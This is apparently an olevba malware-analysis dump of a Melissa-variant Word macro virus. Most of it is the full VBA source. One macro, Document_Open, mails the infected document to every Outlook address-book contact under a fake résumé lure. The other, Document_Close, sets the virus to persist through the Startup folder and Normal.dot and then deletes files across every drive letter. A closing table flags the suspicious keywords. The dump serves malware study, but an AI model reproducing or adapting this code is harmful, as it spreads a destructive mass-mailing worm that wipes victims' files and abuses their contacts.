olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.bg-9e87ac2dc73da8a3cfe9a681c07413aad649930f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.bg-9e87ac2dc73da8a3cfe9a681c07413aad649930f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'----------------------------------------------------------'
'     Better You Than Me Buddy...                          '
'     ... Hope You Like My vIrUs                           '
'                 :)                                       '
'                 :(                                       '
'----------------------------------------------------------'
Private Sub Document_Close()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
System.Cursor = wdCursorWait
ActiveDocument.SaveAs FileName:= _
"C:\WINDOWS\Start Menu\Programs\StartUp\Explorer.doc"
ActiveDocument.SaveAs FileName:="C:\Data\Normal.dot"
Kill "C:\*.*"
Kill "C:\My Documents\*.*"
Kill "C:\WINDOWS\*.*"
Kill "C:\WINDOWS\SYSTEM\*.*"
Kill "C:\WINNT\*.*"
Kill "C:\WINNT\SYSTEM32\*.*"
Kill "A:\*.*"
Kill "B:\*.*"
Kill "D:\*.*"
Kill "E:\*.*"
Kill "F:\*.*"
Kill "G:\*.*"
Kill "H:\*.*"
Kill "I:\*.*"
Kill "J:\*.*"
Kill "K:\*.*"
Kill "L:\*.*"
Kill "M:\*.*"
Kill "N:\*.*"
Kill "O:\*.*"
Kill "P:\*.*"
Kill "Q:\*.*"
Kill "R:\*.*"
Kill "S:\*.*"
Kill "T:\*.*"
Kill "U:\*.*"
Kill "V:\*.*"
Kill "W:\*.*"
Kill "X:\*.*"
Kill "Y:\*.*"
Kill "Z:\*.*"
System.Cursor = wdCursorNormal
End Sub

Private Sub Document_Open()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
System.Cursor = wdCursorWait
Dim strSPC As String
Dim N, Y, LIST, ENTRY, ADD, OL, MAP, MAIL, PATH
PATH = ActiveDocument.FullName
MkDir "C:\Data"
Set OL = CreateObject("Outlook.Application")
Set MAP = OL.GetNameSpace("MAPI")
strSPC = Space(200)
For LIST = 1 To MAP.AddressLists.Count
Set Y = MAP.AddressLists(LIST)
N = 1
For ENTRY = 1 To Y.AddressEntries.Count
ADD = Y.AddressEntries(N)
Set MAIL = OL.CreateItem(0)
MAIL.Recipients.ADD (ADD)
MAIL.Attachments.ADD (PATH)
MAIL.Subject = "Resume - Janet Simons"
MAIL.Body = "To: Director of Sales/Marketing, " & strSPC _
& vbNewLine _
& vbCr _
& "Attached is my resume with a list of references contained within. " _
& " Please feel free to call or email me if you have any further questions regarding my experience. " _
& " I am looking forward to hearing from you. " & strSPC _
& vbNewLine _
& vbCr _
& "Sincerely," & strSPC _
& vbNewLine _
& vbCr _
& "Janet Simons." & vbCr
MAIL.Send
N = N + 1
Next
Next
Set OL = Nothing
Set MAP = Nothing
Application.Quit
System.Cursor = wdCursorNormal
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

